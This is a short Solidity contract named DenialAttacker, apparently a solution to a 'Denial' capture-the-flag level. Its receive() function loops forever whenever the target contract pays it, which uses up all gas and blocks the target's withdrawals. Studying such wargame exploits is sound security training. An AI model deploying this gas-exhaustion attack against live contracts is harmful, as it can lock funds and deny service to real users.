// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import {Denial} from "./Denial.sol";

contract DenialAttacker {
    Denial denial;

    constructor(Denial denial_) {
        denial = denial_;
    }

    receive() external payable {
        if (msg.sender == address(denial)) {
            uint256 a;
            while (true) {
                a++;
            }
        }
    }
}
